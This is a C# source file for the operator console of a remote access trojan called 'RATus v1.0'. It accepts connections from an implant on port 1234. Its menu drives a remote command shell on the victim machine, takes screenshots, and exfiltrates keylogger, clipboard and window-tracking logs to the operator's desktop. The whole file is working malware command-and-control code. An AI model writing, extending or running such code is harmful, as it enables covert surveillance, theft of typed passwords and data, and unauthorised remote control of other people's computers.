using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.IO;

namespace Server {
    
    internal class Program {
        
        const int BUFFER_SIZE = 2048;
        private int selector;
        private bool running;
        private List<string> options;

        IPEndPoint ipe = new IPEndPoint(IPAddress.Any, 1234);
        private Socket client_socket;
        private Socket server_socket;

        public static void Main(string[] args) {
            Program p = new Program();
            p.run();
        }

        public Program() {
            selector = 0;
            running = true;
            options = new List<string>();
            options.Add("shell - execute commands on target machine");
            options.Add("screenshot - take a screenshot of the target's screen");
            options.Add("exfiltrate - retrieve keylogger, clipper and wintracker content");
            options.Add("quit - close the server");
        }

        private void setup_connection() {
            
            // Server socket creation
            server_socket = new Socket(IPAddress.Any.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            server_socket.Bind(ipe);
            server_socket.Listen(5);
            Console.WriteLine("[*] Waiting for client");

            // Client connection
            client_socket = server_socket.Accept();
            Console.WriteLine($"[+] Connection from {client_socket.RemoteEndPoint} received\n");
            server_socket.Close();
        }

        public void run() {
            while(running) {
                try {
                    loop();
                }
                catch (Exception) {
                    //Console.Clear();
                    Console.WriteLine("[*] Server restarted");
                }
            }
        }

        private void loop() {
            
            setup_connection();
            Console.Write("[*] Starting server ");
            Thread.Sleep(250);
            Console.Write(".");
            Thread.Sleep(250);
            Console.Write(".");
            Thread.Sleep(250);
            Console.Write(".");
            Thread.Sleep(250);
            
            // Main program loop
            while (running) {
                
                // Menu printing
                Console.Clear();
                Console.WriteLine("Welcome to RATus v1.0");
                for (var i = 0; i < options.Count; i++) {
                    if(i == selector)
                        Console.Write("> ");
                    Console.WriteLine(options[i]);
                }
                
                // User input
                DateTime timeoutvalue = DateTime.Now.AddSeconds(30);
                bool hadEvent = false;

                while (DateTime.Now < timeoutvalue) {
                    
                    // If event is available, process it
                    if (Console.KeyAvailable) {
                        var input = Console.ReadKey();

                        switch (input.Key) {

                            case ConsoleKey.UpArrow:
                                selector--;
                                if (selector < 0)
                                    selector = options.Count - 1;
                                break;

                            case ConsoleKey.DownArrow:
                                selector++;
                                if (selector >= options.Count)
                                    selector = 0;
                                break;

                            case ConsoleKey.Enter:
                                action(selector);
                                selector = 0;
                                break;
                        }

                        hadEvent = true;
                        break;
                    }
                }
                
                // If no event, check if implant is still alive
                if(!hadEvent) {
                    SendToImplant("ping");
                    var res = ReceiveFromImplant();
                    if (res != "pong") {
                        Console.WriteLine("[-] Implant is unreachable, resetting");
                        return;
                    }
                }
            }
        }

        void action(int select) {
            
            Console.Clear();
            switch (select) {
                case 0: // shell
                    shell();
                    break;
                
                case 1: // screenshot
                    screenshot();
                    break;
                
                case 2: // exfiltrate
                    exfiltrate();
                    break;

                case 3: // quit
                    Console.WriteLine("[*] Closing connection with implant ...");
                    Thread.Sleep(1000);
                    Console.WriteLine("[+] Connection closed");
                    running = false;
                    SendToImplant("close");
                    client_socket.Close();
                    break;
            }
        }

        void exfiltrate() {
            
            // Notify implant
            Console.WriteLine("[*] Retrieving keylogger, clipper and wintracker history ...");
            SendToImplant("exfiltrate");
            
            string filePath = @"C:\Users\raph\Desktop\exfiltrate_" + DateTime.Now.ToString("ddMMyy-HH_mm_ss") + ".txt";
            StreamWriter outFile = File.CreateText(filePath);
            
            // Retrieve clipper history and write to file
            string receive = "";
            while (receive != "end") {
                receive = ReceiveFromImplant();
                if(receive != "end")
                    outFile.WriteLine(receive);
            }
            
            Console.WriteLine("[+] Successfully received exfiltrated content");
            outFile.Close();
            Console.WriteLine("[+] Exfiltrated content saved to " + filePath);
            Thread.Sleep(3000);
        }

        void screenshot() {
            
            // Notify implant
            Console.WriteLine("[*] Telling implant to take a screenshot");
            SendToImplant("screenshot");
            
            // Receive image size then image data
            Console.WriteLine("[*] Receiving data ...");
            var image_size = int.Parse(ReceiveFromImplant());
            Console.WriteLine("[*] Received size : " + image_size);
            byte[] encoded = new byte[image_size];
            Array.Clear(encoded, 0, image_size);
            
            try {
                client_socket.Receive(encoded);
            }
            catch (Exception) {
                Console.WriteLine("\n[-] Connection error with implant, resetting");
                Thread.Sleep(3000);
                throw;
            }
            
            var imageb = Convert.FromBase64String(Encoding.UTF8.GetString(encoded).TrimEnd('\0'));
            
            // Save to file
            string imagePath = @"C:\Users\raph\Desktop\" + DateTime.Now.ToString("ddMMyy-HH_mm_ss") + ".jpg"; // à changer
            File.WriteAllBytes(imagePath, imageb);
            Console.WriteLine("[+] Screenshot successfully saved at " + imagePath);
            Thread.Sleep(3000);
        }

        void shell() {
            
            // Notify implant
            Console.Write($"[*] Starting a new shell on {client_socket.RemoteEndPoint}");
            SendToImplant("shell");
            Console.Write($"\n[+] Shell opened, type \"quit\" to come back\n");

            string msg = "";
            while (true) {
                Console.Write("> ");
                msg = Console.ReadLine();
                SendToImplant(msg);

                if (String.Equals(msg, "exit"))
                    break;

                msg = ReceiveFromImplant();
                Console.WriteLine($"{msg}");
            }
            
            Console.Write($"\n[*] Shell with {client_socket.RemoteEndPoint} closed\n");
            Thread.Sleep(1000);
            //client_socket.Close();
        }
        
        void SendToImplant(string cmd) {
            try {
                client_socket.Send(Encoding.UTF8.GetBytes(cmd));
            }
            catch (Exception) {
                Console.WriteLine("\n[-] Connection error with implant, resetting");
                Thread.Sleep(3000);
                throw;
            }
            Thread.Sleep(200);
        }
        
        string ReceiveFromImplant() {
            byte[] b = new byte[BUFFER_SIZE];
            Array.Clear(b, 0, BUFFER_SIZE);

            try {
                client_socket.Receive(b);
            }
            catch (Exception) {
                Console.WriteLine("\n[-] Connection error with implant, resetting");
                Thread.Sleep(3000);
                throw;
            }
            return Encoding.UTF8.GetString(b).TrimEnd('\0');
        }
    }
}